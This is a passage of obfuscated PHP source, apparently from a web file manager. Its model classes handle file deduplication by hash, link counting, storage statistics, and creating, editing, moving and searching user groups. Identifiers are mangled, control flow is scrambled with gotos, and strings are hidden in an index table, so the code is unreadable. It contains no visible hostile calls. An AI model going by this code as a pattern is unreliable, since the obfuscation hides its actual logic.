$AƒİÍ¸ó†Å) { goto C¸¥¤Ö²Ú; bâ¨Îİ…Ã: switch ($FØ„Âîº¶Ş) { case $béÃö³”Ù[2051]: $B‰…ùòÄë‰ = $B‰…ùòÄë‰ . $béÃö³”Ù[94] . $AƒİÍ¸ó†Å->ext($dÖóœÅµé ); if ($AƒİÍ¸ó†Å->ext($dÖóœÅµé ) == $béÃö³”Ù[1990]) { $B‰…ùòÄë‰ .= $béÃö³”Ù[2052]; } break; case $béÃö³”Ù[2053]: goto c¢÷¡Ï£Ìê; c¢÷¡Ï£Ìê: $Eˆóõ§ö®õ = Model($béÃö³”Ù[1045])->get($béÃö³”Ù[1227]); $e´Ç«¶´“ = substr(md5($béÃö³”Ù[1811] . $Eˆóõ§ö®õ . date($béÃö³”Ù[660])), 0, 8); $d£µÈöãø = KodIO::defaultIO() . date($béÃö³”Ù[2054]) . $e´Ç«¶´“ . $béÃö³”Ù[8]; goto b³«³äĞ”±; eâÆ±—¦È: break; goto F‘È“‰Ô¡Ô; b³«³äĞ”±: if ($AƒİÍ¸ó†Å->ext($dÖóœÅµé ) == $béÃö³”Ù[1990]) { $dÖóœÅµé  .= $béÃö³”Ù[2052]; } $C×µ¶ÁÑ“ò = IO::fileNameAuto($d£µÈöãø, $dÖóœÅµé ); $B‰…ùòÄë‰ = $d£µÈöãø . $C×µ¶ÁÑ“ò; goto eâÆ±—¦È; F‘È“‰Ô¡Ô: case $béÃö³”Ù[2050]: break; default: break; } return $B‰…ùòÄë‰; goto E÷Õ±¿¬‰; Dœ¹™–˜é: $B‰…ùòÄë‰ = $d£µÈöãø . rand_string(5) . short_id(100); $dÖóœÅµé  = str_replace($béÃö³”Ù[8], $béÃö³”Ù[71], KodIO::clear($dÖóœÅµé )); if (!$dÖóœÅµé ) { $FØ„Âîº¶Ş = $béÃö³”Ù[2050]; } goto bâ¨Îİ…Ã; C¸¥¤Ö²Ú: $béÃö³”Ù =& $_SERVER[‘®…¢À]; $FØ„Âîº¶Ş = Model($béÃö³”Ù[1045])->get($béÃö³”Ù[2048]); $d£µÈöãø = KodIO::defaultIO() . date($béÃö³”Ù[2049]); goto Dœ¹™–˜é; E÷Õ±¿¬‰: } public function addFileByRemote($FíùÑ¡ Ö», $F¼­¯Ü¥, $E“¨™âÅò = array()) { goto E¼œ÷íÕµ; E¼œ÷íÕµ: $AÚ¡°‰ÛÅå =& $_SERVER[‘®…¢À]; if (!IO::exist($FíùÑ¡ Ö»)) { return !1; } $f¤„¢×¿åÍ = $E“¨™âÅò[$AÚ¡°‰ÛÅå[160]] ? $E“¨™âÅò[$AÚ¡°‰ÛÅå[160]] : $AÚ¡°‰ÛÅå[33]; goto d©¥¤Õ÷„Ï; d©¥¤Õ÷„Ï: $Fïâ¢ùÖ = IO::hashMd5($FíùÑ¡ Ö», $f¤„¢×¿åÍ); $F–âì×†ˆ† = KodIO::defaultDriver(); $BÒ¼Ë“÷º = array($AÚ¡°‰ÛÅå[511] => IO::size($FíùÑ¡ Ö»), $AÚ¡°‰ÛÅå[2055] => 1, $AÚ¡°‰ÛÅå[382] => $F¼­¯Ü¥, $AÚ¡°‰ÛÅå[719] => $F–âì×†ˆ†[$AÚ¡°‰ÛÅå[363]], $AÚ¡°‰ÛÅå[383] => $FíùÑ¡ Ö», $AÚ¡°‰ÛÅå[2056] => $E“¨™âÅò[$AÚ¡°‰ÛÅå[161]] ? $E“¨™âÅò[$AÚ¡°‰ÛÅå[161]] : IO::hashSimple($FíùÑ¡ Ö»), $AÚ¡°‰ÛÅå[2057] => $Fïâ¢ùÖ ? $Fïâ¢ùÖ : $f¤„¢×¿åÍ); goto CËºÑõ‡; CËºÑõ‡: if ($c‚«²•ˆ¯ˆ = $this->addFileCheckExist($BÒ¼Ë“÷º[$AÚ¡°‰ÛÅå[161]], $BÒ¼Ë“÷º[$AÚ¡°‰ÛÅå[160]], $BÒ¼Ë“÷º[$AÚ¡°‰ÛÅå[78]])) { return $c‚«²•ˆ¯ˆ; } return $this->addFileData($BÒ¼Ë“÷º); goto Cæª•·Òë; Cæª•·Òë: } private function addFileData($f…ö‰Á¿´«) { $FŸõÚŒ–Ìª =& $_SERVER[‘®…¢À]; if (!$f…ö‰Á¿´«) { return !1; } $f…ö‰Á¿´«[$FŸõÚŒ–Ìª[78]] = intval($f…ö‰Á¿´«[$FŸõÚŒ–Ìª[78]]); if (!$f…ö‰Á¿´«[$FŸõÚŒ–Ìª[78]] && strlen($f…ö‰Á¿´«[$FŸõÚŒ–Ìª[161]]) > 32) { $f…ö‰Á¿´«[$FŸõÚŒ–Ìª[78]] = intval(substr($f…ö‰Á¿´«[$FŸõÚŒ–Ìª[161]], 32)); } $C”Ï„Õá˜ = $this->add($f…ö‰Á¿´«); return $this->find($C”Ï„Õá˜); } public function addFile($a»ŸåâÖ’’, $Cñ¯Öƒ…ªæ, $aë†øÚ·œ› = false) { $DƒÄŒ¹‚– = IO::hashSimple($a»ŸåâÖ’’); $f¤”¦ÎåÛÚ = IO::hashMd5($a»ŸåâÖ’’); $dÍô°Œù¯è = IO::size($a»ŸåâÖ’’); if ($dãåŞ‘…¦ = $this->addFileCheckExist($DƒÄŒ¹‚–, $f¤”¦ÎåÛÚ, $dÍô°Œù¯è)) { return $dãåŞ‘…¦; } $eè‚é¼ˆ¥Ä = $this->addFileMake($a»ŸåâÖ’’, $dÍô°Œù¯è, $DƒÄŒ¹‚–, $f¤”¦ÎåÛÚ, $Cñ¯Öƒ…ªæ, $aë†øÚ·œ›); return $this->addFileData($eè‚é¼ˆ¥Ä); } public function addFileMake($C³³ŠˆŞÇÁ, $E†¥”¨“² , $cÅÛ’ø½“, $b¶¸¿ÍªÆß, $A‘Àäé‘™, $eæ¸ÉÓáº) { goto E–ßÑâçÇ; dÙœÊÀĞà®: $EË÷£º•Ë‡ = KodIO::defaultDriver(); $C„Ëè½Èê = array($CÌÜÇ˜‡ŒÑ[511] => $E†¥”¨“² , $CÌÜÇ˜‡ŒÑ[2055] => 1, $CÌÜÇ˜‡ŒÑ[382] => $A‘Àäé‘™, $CÌÜÇ˜‡ŒÑ[719] => $EË÷£º•Ë‡[$CÌÜÇ˜‡ŒÑ[363]], $CÌÜÇ˜‡ŒÑ[383] => $d‰¨¿³ˆø‹, $CÌÜÇ˜‡ŒÑ[2056] => $cÅÛ’ø½“, $CÌÜÇ˜‡ŒÑ[2057] => $b¶¸¿ÍªÆß); return $C„Ëè½Èê; goto C£ó¶¢÷°; E–ßÑâçÇ: $CÌÜÇ˜‡ŒÑ =& $_SERVER[‘®…¢À]; $d‰¨¿³ˆø‹ = $this->createFileName($A‘Àäé‘™); $b‡¼É†¥âò = get_path_father($d‰¨¿³ˆø‹); goto bã‰ç´•îË; bã‰ç´•îË: $E«›¿×Á¤¶ = get_path_this($d‰¨¿³ˆø‹); if ($eæ¸ÉÓáº) { $F î¨¿Úã = IO::move($C³³ŠˆŞÇÁ, $b‡¼É†¥âò, !1, $E«›¿×Á¤¶); } else { $F î¨¿Úã = IO::copy($C³³ŠˆŞÇÁ, $b‡¼É†¥âò, !1, $E«›¿×Á¤¶); } if (!$F î¨¿Úã) { return !1; } goto dÙœÊÀĞà®; C£ó¶¢÷°: } public function addFileCheckExist($E©½Û«‰÷°, $A½÷ÅÇª Ù, $BÊİáòãñ) { $d³‘Œ¶ˆº =& $_SERVER[‘®…¢À]; $fÉ¸îò„ = $this->findByHash($E©½Û«‰÷°, $A½÷ÅÇª Ù); if (!$fÉ¸îò„) { return !1; } $B§Ôõ×‚´È = array($d³‘Œ¶ˆº[2055] => intval($fÉ¸îò„[$d³‘Œ¶ˆº[2058]]) + 1, $d³‘Œ¶ˆº[511] => $BÊİáòãñ); $this->where(array($d³‘Œ¶ˆº[415] => $fÉ¸îò„[$d³‘Œ¶ˆº[414]]))->save($B§Ôõ×‚´È); return $fÉ¸îò„; } public function remove($aÍ«Ï‹‚Ñì) { $this->linkCountChange($aÍ«Ï‹‚Ñì, !1); $this->clearEmpty(); return !0; } public function linkAdd($Côò˜ŒÌÆÂ) { $this->linkCountChange($Côò˜ŒÌÆÂ, !0); } public function linkCountChange($c…•±Ê„Û, $f”è÷—) { goto e›ãÆÅ»˜É; e •É¨òé: $eÆ ÒÌå† = array(); foreach ($c…•±Ê„Û as $fÄÖÄÔ›‚¤) { $F†•Œ«ÓŒ = $fÄÖÄÔ›‚¤ . $F—²Úç÷œ[33]; if (!$eÆ ÒÌå†[$F†•Œ«ÓŒ]) { $eÆ ÒÌå†[$F†•Œ«ÓŒ] = 0; } $eÆ ÒÌå†[$F†•Œ«ÓŒ]++; } $BÙÈğ£÷»Ç = array(); goto B¥½‘â‚äå; B¥½‘â‚äå: foreach ($eÆ ÒÌå† as $fÄÖÄÔ›‚¤ => $cßùİ„¿®“) { $F†•Œ«ÓŒ = $cßùİ„¿®“ . $F—²Úç÷œ[33]; if (!$BÙÈğ£÷»Ç[$F†•Œ«ÓŒ]) { $BÙÈğ£÷»Ç[$F†•Œ«ÓŒ] = array(); } $BÙÈğ£÷»Ç[$F†•Œ«ÓŒ][] = $fÄÖÄÔ›‚¤; } foreach ($BÙÈğ£÷»Ç as $cßùİ„¿®“ => $E”øàÇ¡°) { if (!$E”øàÇ¡°) { continue; } $cßùİ„¿®“ = $f”è÷— ? $cßùİ„¿®“ : -intval($cßùİ„¿®“); $e¯è‹É¿è = array($F—²Úç÷œ[414] => array($F—²Úç÷œ[7], $E”øàÇ¡°)); if ($cßùİ„¿®“ < 0) { $e¯è‹É¿è[$F—²Úç÷œ[2058]] = array($F—²Úç÷œ[910], abs($cßùİ„¿®“)); } $this->where($e¯è‹É¿è)->setAdd($F—²Úç÷œ[2058], $cßùİ„¿®“); } goto CØâÅÏî–¥; e›ãÆÅ»˜É: $F—²Úç÷œ =& $_SERVER[‘®…¢À]; if (!$c…•±Ê„Û) { return; } if (!is_array($c…•±Ê„Û)) { $c…•±Ê„Û = array($c…•±Ê„Û); } goto e •É¨òé; CØâÅÏî–¥: } public function findByHash($CÂ¹Ò†‘Û, $D™Š‰Š¾Á¹ = false) { $dÆÓòÁª‰“ =& $_SERVER[‘®…¢À]; if (!$CÂ¹Ò†‘Û && !$D™Š‰Š¾Á¹) { return !1; } $f©ìº²³Ç = array($dÆÓòÁª‰“[2056] => $CÂ¹Ò†‘Û); if ($D™Š‰Š¾Á¹) { $f©ìº²³Ç = array($dÆÓòÁª‰“[2057] => $D™Š‰Š¾Á¹); } return $this->order($dÆÓòÁª‰“[2059])->where($f©ìº²³Ç)->find(); } public function clearEmpty($Bù„öÂ¨Íò = 0) { goto aÔ‡˜œĞŒÂ; bÓÀÍ‡­: $cÌ´µœ«µÁ = $this->where($CÕøâ¸Ô¬)->select(); if (!$cÌ´µœ«µÁ) { return; } $c³ÛğÖˆÃÙ = new Task($e ÇØÜ«»[2061], $e ÇØÜ«»[33], count($cÌ´µœ«µÁ)); goto dˆ¢¹¬Ñ­¡; aÔ‡˜œĞŒÂ: $e ÇØÜ«» =& $_SERVER[‘®…¢À]; $fÀ±ä©Î… = time() - 3600 * 24 * $Bù„öÂ¨Íò; $CÕøâ¸Ô¬ = $e ÇØÜ«»[2060] . $fÀ±ä©Î…; goto bÓÀÍ‡­; dˆ¢¹¬Ñ­¡: foreach ($cÌ´µœ«µÁ as $B„âÚ”àíÕ) { $c³ÛğÖˆÃÙ->update(1); $this->resetFile($B„âÚ”àíÕ); } $c³ÛğÖˆÃÙ->end(); goto bí¦Šİ™¢­; bí¦Šİ™¢­: } private function resetFile($EÌäè¸ß¾“) { goto fÌÁ”Ğ©›¸; F–»Í·ŸäĞ: $c¢Ù‘õ°˜§ = Model($C¸²ãôä«Ü[2062])->where($Cª™–ì±´ë)->count(); $a±àÊ‚Œ…Ï = intval($E›Ûº½ªİ) + intval($c¢Ù‘õ°˜§); if ($a±àÊ‚Œ…Ï == 0) { IO::remove($EÌäè¸ß¾“[$C¸²ãôä«Ü[76]]); $this->where($Cª™–ì±´ë)->delete(); $this->metaSet($EÌäè¸ß¾“[$C¸²ãôä«Ü[414]], null, null); return; } goto fâ™ÇËÃ‰ò; fâ™ÇËÃ‰ò: if ($EÌäè¸ß¾“[$C¸²ãôä«Ü[2058]] != $a±àÊ‚Œ…Ï) { $this->where($Cª™–ì±´ë)->save(array($C¸²ãôä«Ü[2055] => $a±àÊ‚Œ…Ï)); } goto fÁ¯İ²ó«ç; fÌÁ”Ğ©›¸: $C¸²ãôä«Ü =& $_SERVER[‘®…¢À]; $Cª™–ì±´ë = array($C¸²ãôä«Ü[415] => $EÌäè¸ß¾“[$C¸²ãôä«Ü[414]]); $E›Ûº½ªİ = Model($C¸²ãôä«Ü[1067])->where($Cª™–ì±´ë)->count(); goto F–»Í·ŸäĞ; fÁ¯İ²ó«ç: } public function storageInfo($dï•æÔœé˜ = false) { goto e±µÎëÖ¿’; Eâ÷¼İĞ‰”: for ($BÇ‹À¸ÌêÎ = 0; $BÇ‹À¸ÌêÎ < $b¥‹¿Õİµ»; $BÇ‹À¸ÌêÎ = $BÇ‹À¸ÌêÎ + $dÓ‘¢‰–Àî) { $a•·µÙÇÚé = $this->limit($BÇ‹À¸ÌêÎ, $BÇ‹À¸ÌêÎ + $dÓ‘¢‰–Àî)->select(); foreach ($a•·µÙÇÚé as $cÍæÂŠğ®Œ) { $e”“İ‰½ãË += $cÍæÂŠğ®Œ[$Dµ‚šíÂ[78]] * $cÍæÂŠğ®Œ[$Dµ‚šíÂ[2058]]; $A¦ÂŠö‘î¶ += $cÍæÂŠğ®Œ[$Dµ‚šíÂ[78]] * ($cÍæÂŠğ®Œ[$Dµ‚šíÂ[2058]] - 1); $c‘”¯öóó += $cÍæÂŠğ®Œ[$Dµ‚šíÂ[2058]]; } } $aßí£›æ¯ = array($Dµ‚šíÂ[2063] => $e”“İ‰½ãË, $Dµ‚šíÂ[2064] => $A¦ÂŠö‘î¶, $Dµ‚šíÂ[2065] => $A¦ÂŠö‘î¶ / $e”“İ‰½ãË, $Dµ‚šíÂ[82] => $b¥‹¿Õİµ», $Dµ‚šíÂ[2066] => $c‘”¯öóó); return $aßí£›æ¯; goto BŒ¡È²˜ª–; e±µÎëÖ¿’: $Dµ‚šíÂ =& $_SERVER[‘®…¢À]; $b¥‹¿Õİµ» = $this->count() + 0.0; $A¦ÂŠö‘î¶ = 0; goto D÷Œ¨ÌÊÂÊ; D÷Œ¨ÌÊÂÊ: $e”“İ‰½ãË = 1; $c‘”¯öóó = 0; $dÓ‘¢‰–Àî = 5000; goto Eâ÷¼İĞ‰”; BŒ¡È²˜ª–: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\x70"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\x61\155\145" => "\x67\x72\x6f\x75\160\137\x6d\x65\164\141", "\155\x65\x74\141\106\151\x65\154\x64" => "\147\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($CˆÕ³Àğ¸) { $BÌ¯ĞãÜ£’ =& $_SERVER[‘®…¢À]; return array($BÌ¯ĞãÜ£’[2067] => array($CˆÕ³Àğ¸[0], $BÌ¯ĞãÜ£’[2068]), $BÌ¯ĞãÜ£’[2069] => array($CˆÕ³Àğ¸[0], $BÌ¯ĞãÜ£’[2068])); } protected function getInfo($Fé“ÛïÕëò) { $D¶Û³Ó¹¢Ç = $this->getInfoSimple($Fé“ÛïÕëò); if (!$D¶Û³Ó¹¢Ç) { return !1; } return $this->_listDataApplyItem($D¶Û³Ó¹¢Ç); } protected function getInfoSimple($d„ƒâÆÙ†ô, $dé«Ê‡¯êé = false) { $Dáù°óâšÂ =& $_SERVER[‘®…¢À]; if ($dé«Ê‡¯êé) { $AÖÆí£‡ä¬ = array($Dáù°óâšÂ[2000] => intval($d„ƒâÆÙ†ô)); return $this->where($AÖÆí£‡ä¬)->find(); } return $this->cacheFunctionGet($Dáù°óâšÂ[2070], $d„ƒâÆÙ†ô); } protected function groupAdd($D¤ø×é´Ä) { goto a·»£‹Ş¹¨; A¸õ¦Ï£ó¸: return $dÔøÓî°¯; goto F®¥ù´ê©; a·»£‹Ş¹¨: $Dñ’·‡ùÊ£ =& $_SERVER[‘®…¢À]; if (!$D¤ø×é´Ä[$Dñ’·‡ùÊ£[456]] && isset($D¤ø×é´Ä[$Dñ’·‡ùÊ£[2000]]) && $D¤ø×é´Ä[$Dñ’·‡ùÊ£[2000]] == 1) { if ($DØ‘ğ‹¾¿ = $this->getInfoSimple($D¤ø×é´Ä[$Dñ’·‡ùÊ£[2000]], !0)) { return $D¤ø×é´Ä[$Dñ’·‡ùÊ£[2000]]; } } else { $DØ‘ğ‹¾¿ = $this->getInfoSimple($D¤ø×é´Ä[$Dñ’·‡ùÊ£[456]]); if (!$DØ‘ğ‹¾¿) { return !1; } } $eà´Óê¯Øä = $Dñ’·‡ùÊ£[2071]; goto E×‰„¼ŒäÆ; E×‰„¼ŒäÆ: if ($DØ‘ğ‹¾¿[$Dñ’·‡ùÊ£[454]]) { $eà´Óê¯Øä = $DØ‘ğ‹¾¿[$Dñ’·‡ùÊ£[454]] . $DØ‘ğ‹¾¿[$Dñ’·‡ùÊ£[2000]] . $Dñ’·‡ùÊ£[47]; } $Eê»øĞ½Ü© = array($Dñ’·‡ùÊ£[382] => $this->groupNameAuto($D¤ø×é´Ä[$Dñ’·‡ùÊ£[456]], $D¤ø×é´Ä[$Dñ’·‡ùÊ£[28]]), $Dñ’·‡ùÊ£[364] => $D¤ø×é´Ä[$Dñ’·‡ùÊ£[456]], $Dñ’·‡ùÊ£[516] => $eà´Óê¯Øä, $Dñ’·‡ùÊ£[2072] => $D¤ø×é´Ä[$Dñ’·‡ùÊ£[1984]], $Dñ’·‡ùÊ£[2073] => 0, $Dñ’·‡ùÊ£[2004] => 0); if (!empty($D¤ø×é´Ä[$Dñ’·‡ùÊ£[2000]])) { $Eê»øĞ½Ü©[$Dñ’·‡ùÊ£[2000]] = $D¤ø×é´Ä[$Dñ’·‡ùÊ£[2000]]; } goto b ô‡ï¡æÅ; b ô‡ï¡æÅ: $dÔøÓî°¯ = $this->add($Eê»øĞ½Ü©); $this->setNamePinyin($dÔøÓî°¯, $Eê»øĞ½Ü©[$Dñ’·‡ùÊ£[28]]); Model($Dñ’·‡ùÊ£[1067])->groupRootAdd($dÔøÓî°¯); goto A¸õ¦Ï£ó¸; F®¥ù´ê©: } protected function groupEdit($DÓ¿ƒ÷ßÁˆ, $aÇçµÎÁ¥) { $eÔ‰ò¶…õ† =& $_SERVER[‘®…¢À]; if (!empty($aÇçµÎÁ¥[$eÔ‰ò¶…õ†[456]])) { $B‰éóèê = $this->getInfoSimple($DÓ¿ƒ÷ßÁˆ); $Cîêº¸ß±Ã = $this->getInfoSimple($aÇçµÎÁ¥[$eÔ‰ò¶…õ†[456]]); if (!$B‰éóèê || !$Cîêº¸ß±Ã) { return !1; } if ($B‰éóèê[$eÔ‰ò¶…õ†[2000]] == $Cîêº¸ß±Ã[$eÔ‰ò¶…õ†[2000]]) { return !1; } if ($aÇçµÎÁ¥[$eÔ‰ò¶…õ†[456]] != $B‰éóèê[$eÔ‰ò¶…õ†[456]]) { if ($Cîêº¸ß±Ã[$eÔ‰ò¶…õ†[454]] !== $B‰éóèê[$eÔ‰ò¶…õ†[454]] && strpos($Cîêº¸ß±Ã[$eÔ‰ò¶…õ†[454]], $B‰éóèê[$eÔ‰ò¶…õ†[454]] . $B‰éóèê[$eÔ‰ò¶…õ†[2000]] . $eÔ‰ò¶…õ†[47]) === 0) { return !1; } $aÇçµÎÁ¥[$eÔ‰ò¶…õ†[516]] = $Cîêº¸ß±Ã[$eÔ‰ò¶…õ†[454]] . $aÇçµÎÁ¥[$eÔ‰ò¶…õ†[456]] . $eÔ‰ò¶…õ†[47]; $this->_changeChildLevel($B‰éóèê, $Cîêº¸ß±Ã); } } if (isset($aÇçµÎÁ¥[$eÔ‰ò¶…õ†[28]])) { $this->setNamePinyin($DÓ¿ƒ÷ßÁˆ, $aÇçµÎÁ¥[$eÔ‰ò¶…õ†[28]]); } return $this->where(array($eÔ‰ò¶…õ†[2074] => $DÓ¿ƒ÷ßÁˆ))->save($aÇçµÎÁ¥); } private function _changeChildLevel($dÁ¬ÙÛŸµÏ, $D¬šñ”ê¾‘, $C…ä“èƒÃ  = false) { goto eÀÕ½·÷§; eª êÉÅÅç: if ($C…ä“èƒÃ ) { $FÏêã–Ì¬Ğ = $D¬šñ”ê¾‘[$aÊã“ÅÒªº[454]] . $D¬šñ”ê¾‘[$aÊã“ÅÒªº[2000]] . $aÊã“ÅÒªº[47]; } $a Ìõ‘Èè = array($aÊã“ÅÒªº[516] => array($aÊã“ÅÒªº[474], $dÁ¬ÙÛŸµÏ[$aÊã“ÅÒªº[454]] . $dÁ¬ÙÛŸµÏ[$aÊã“ÅÒªº[2000]] . $aÊã“ÅÒªº[475])); $a©Ö«£ïßš = array($aÊã“ÅÒªº[516] => array($aÊã“ÅÒªº[525], "\162\145\160\154\141\143\145\50\x70\x61\162\x65\156\x74\114\x65\x76\145\x6c\x2c\x27{$fßÚ‰°ºÂ}\47\x2c\x27{$FÏêã–Ì¬Ğ}\47\x29")); goto EÄ‹½´ë; eÀÕ½·÷§: $aÊã“ÅÒªº =& $_SERVER[‘®…¢À]; $fßÚ‰°ºÂ = $dÁ¬ÙÛŸµÏ[$aÊã“ÅÒªº[454]] . $dÁ¬ÙÛŸµÏ[$aÊã“ÅÒªº[2000]] . $aÊã“ÅÒªº[47]; $FÏêã–Ì¬Ğ = $D¬šñ”ê¾‘[$aÊã“ÅÒªº[454]] . $D¬šñ”ê¾‘[$aÊã“ÅÒªº[2000]] . $aÊã“ÅÒªº[47] . $dÁ¬ÙÛŸµÏ[$aÊã“ÅÒªº[2000]] . $aÊã“ÅÒªº[47]; goto eª êÉÅÅç; EÄ‹½´ë: $this->where($a Ìõ‘Èè)->data($a©Ö«£ïßš)->save(); goto D”ÑÕÌÊ; D”ÑÕÌÊ: } public function setNamePinyin($bÀŠ²†¼¤ñ, $eÀî›…ø½ = false) { $C–öùÅšÙÃ =& $_SERVER[‘®…¢À]; if (!$eÀî›…ø½) { $fÎåñ£¤Ç = $this->getInfoSimple($bÀŠ²†¼¤ñ); $eÀî›…ø½ = $fÎåñ£¤Ç[$C–öùÅšÙÃ[28]]; } if (!Input::check($eÀî›…ø½, $C–öùÅšÙÃ[519])) { $this->metaSet($bÀŠ²†¼¤ñ, $C–öùÅšÙÃ[411], null); $this->metaSet($bÀŠ²†¼¤ñ, $C–öùÅšÙÃ[410], null); return; } $aÓÌÊÀº¥Ã = array($C–öùÅšÙÃ[411] => str_replace($C–öùÅšÙÃ[50], $C–öùÅšÙÃ[33], Pinyin::encode($eÀî›…ø½)), $C–öùÅšÙÃ[410] => Pinyin::encode($eÀî›…ø½, $C–öùÅšÙÃ[520])); $this->metaSet($bÀŠ²†¼¤ñ, $aÓÌÊÀº¥Ã); } protected function groupRemove($dáƒê¾í½î) { goto E›˜—Š÷°İ; F‘ã¼Š¸¹Š: if (!$dí’ÓÄ‘‡ || $dí’ÓÄ‘‡[$a˜ò ³ßĞí[456]] == 0) { return !1; } $CÇù”Îˆ‘÷ = $this->getInfoSimple($dí’ÓÄ‘‡[$a˜ò ³ßĞí[456]]); $this->_changeChildLevel($dí’ÓÄ‘‡, $CÇù”Îˆ‘÷, !0); goto fÍ‡à’†–Ñ; fÍ‡à’†–Ñ: $this->where(array($a˜ò ³ßĞí[456] => $dáƒê¾í½î))->save(array($a˜ò ³ßĞí[456] => $dí’ÓÄ‘‡[$a˜ò ³ßĞí[456]])); Model($a˜ò ³ßĞí[2075])->where($dÛ·‡¢ğøÙ)->delete(); Model($a˜ò ³ßĞí[2076])->where($dÛ·‡¢ğøÙ)->delete(); goto f„¬Àğ¢; f„¬Àğ¢: Model($a˜ò ³ßĞí[735])->groupRootRemove($dáƒê¾í½î); return $this->where($dÛ·‡¢ğøÙ)->delete(); goto f¿×Ó¸…‹É; E›˜—Š÷°İ: $a˜ò ³ßĞí =& $_SERVER[‘®…¢À]; $dÛ·‡¢ğøÙ = array($a˜ò ³ßĞí[2000] => $dáƒê¾í½î); $dí’ÓÄ‘‡ = $this->where($dÛ·‡¢ğøÙ)->find(); goto F‘ã¼Š¸¹Š; f¿×Ó¸…‹É: } public function listData() { $A¡‘àÛ™Ø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A¡‘àÛ™Ø[$_SERVER[‘®…¢À][350]]); return $A¡‘àÛ™Ø; } private function _makeOrder($A•ê£„Å = '') { goto aÈÔ·¶¦à­; CÑ‡ÔãËÛ: $F­œÇ­æŠ = Input::get($b®Æ²¾‘Ÿ®[402], $b®Æ²¾‘Ÿ®[7], $b®Æ²¾‘Ÿ®[2074], $cğ‘­¶¿åÇ); $F·‡‡ˆÁĞâ = Input::get($b®Æ²¾‘Ÿ®[403], $b®Æ²¾‘Ÿ®[7], $b®Æ²¾‘Ÿ®[2077], array($b®Æ²¾‘Ÿ®[2077], $b®Æ²¾‘Ÿ®[399])); $F·‡‡ˆÁĞâ = $dÜµÎ—±ä¦[$F·‡‡ˆÁĞâ]; goto cˆ¿ÃÙÕ—„; cˆ¿ÃÙÕ—„: $A•ê£„Å = $A•ê£„Å . "{$F­œÇ­æŠ}\x20{$F·‡‡ˆÁĞâ}\54\40\x67\x72\157\x75\160\x49\104\x20\x61\x73\x63"; return $this->order($A•ê£„Å); goto e‡õÍƒ•„; aÈÔ·¶¦à­: $b®Æ²¾‘Ÿ® =& $_SERVER[‘®…¢À]; $cğ‘­¶¿åÇ = array($b®Æ²¾‘Ÿ®[2000], $b®Æ²¾‘Ÿ®[28], $b®Æ²¾‘Ÿ®[1986], $b®Æ²¾‘Ÿ®[184]); $dÜµÎ—±ä¦ = array($b®Æ²¾‘Ÿ®[397] => $b®Æ²¾‘Ÿ®[398], $b®Æ²¾‘Ÿ®[399] => $b®Æ²¾‘Ÿ®[400]); goto CÑ‡ÔãËÛ; e‡õÍƒ•„: } public function listChild($Cáà†¾‘å) { $fÙÔ«êÁÑõ =& $_SERVER[‘®…¢À]; $dù†äìê˜Œ = $this->where(array($fÙÔ«êÁÑõ[456] => $Cáà†¾‘å))->_makeOrder()->selectPage(200); $this->_listDataApply($dù†äìê˜Œ[$fÙÔ«êÁÑõ[350]]); return $dù†äìê˜Œ; } public function listByID($eÌ‡Ï²‰) { $eÚÆè“÷‹Û =& $_SERVER[‘®…¢À]; if (!$eÌ‡Ï²‰) { return array(); } $fî—ªßÃ˜ = array($eÚÆè“÷‹Û[2000] => array($eÚÆè“÷‹Û[7], $eÌ‡Ï²‰)); $báÑğÏóİØ = $this->where($fî—ªßÃ˜)->select(); $this->_listDataApply($báÑğÏóİØ); return $báÑğÏóİØ; } public function listSearch($eö”‰é–É¼) { goto E·øØœ’·; d¸¥ÙŠÆ: $bµ›È›¯Ä = $this->_makeOrder()->where($E¨Š“İ…²à)->selectPage(20); $bµ›È›¯Ä = $bµ›È›¯Ä ? $bµ›È›¯Ä : array(); if (!$bµ›È›¯Ä || count($bµ›È›¯Ä[$dàï¼õÁ¦µ[350]]) < 5 && Input::check($b††§ñœ³¸, $dàï¼õÁ¦µ[303])) { $fÖ¢¸¬ƒ¨· = $this->_searchFromMeta($dàï¼õÁ¦µ[410], $b††§ñœ³¸, 10); $cÕÊïÚ¨¡â = $this->_searchFromMeta($dàï¼õÁ¦µ[411], $b††§ñœ³¸, 10); $có±é‚ã = array_merge($fÖ¢¸¬ƒ¨·, $cÕÊïÚ¨¡â, $bµ›È›¯Ä[$dàï¼õÁ¦µ[350]]); $bµ›È›¯Ä[$dàï¼õÁ¦µ[350]] = array_unique_by_key($có±é‚ã, $dàï¼õÁ¦µ[2000]); $bµ›È›¯Ä[$dàï¼õÁ¦µ[347]][$dàï¼õÁ¦µ[348]] = count($bµ›È›¯Ä[$dàï¼õÁ¦µ[350]]); $bµ›È›¯Ä[$dàï¼õÁ¦µ[347]][$dàï¼õÁ¦µ[349]] = ceil($bµ›È›¯Ä[$dàï¼õÁ¦µ[347]][$dàï¼õÁ¦µ[348]] / $bµ›È›¯Ä[$dàï¼õÁ¦µ[347]][$dàï¼õÁ¦µ[345]]); } goto E‡ŒëíÛ’»; e„ğ½©ôÉè: if (!trim($b††§ñœ³¸)) { return !1; } $b††§ñœ³¸ = str_replace($dàï¼õÁ¦µ[2080], $dàï¼õÁ¦µ[2081], $b††§ñœ³¸); $E¨Š“İ…²à = array($dàï¼õÁ¦µ[2000] => array($dàï¼õÁ¦µ[734], "\x25{$b††§ñœ³¸}\45"), $dàï¼õÁ¦µ[28] => array($dàï¼õÁ¦µ[734], "\x25{$b††§ñœ³¸}\45"), $dàï¼õÁ¦µ[895] => $dàï¼õÁ¦µ[2082]); goto d¸¥ÙŠÆ; E·øØœ’·: $dàï¼õÁ¦µ =& $_SERVER[‘®…¢À]; $b††§ñœ³¸ = $eö”‰é–É¼[$dàï¼õÁ¦µ[2078]]; $dœøƒÍÜ°‰ = isset($eö”‰é–É¼[$dàï¼õÁ¦µ[2079]]) ? $eö”‰é–É¼[$dàï¼õÁ¦µ[2079]] : !1; goto e„ğ½©ôÉè; E‡ŒëíÛ’»: $this->_listDataApply($bµ›È›¯Ä[$dàï¼õÁ¦µ[350]]); return $bµ›È›¯Ä; goto E¡ÚùÈšÎ½; E¡ÚùÈšÎ½: } private function _searchFromMeta($eó¨ÀÉ»¶, $D¾Ä³¾ÉõÓ, $FíÚÚİ…Ó”) { goto BŸ•Ğ˜¬®—; Cçß¥ÖËŞ: $aÂ‚¾»©Âƒ = $this->where(array($AÁ‡ë‹‰â[2074] => array($AÁ‡ë‹‰â[7], $cÜç¬Ç˜À¤)))->select(); if 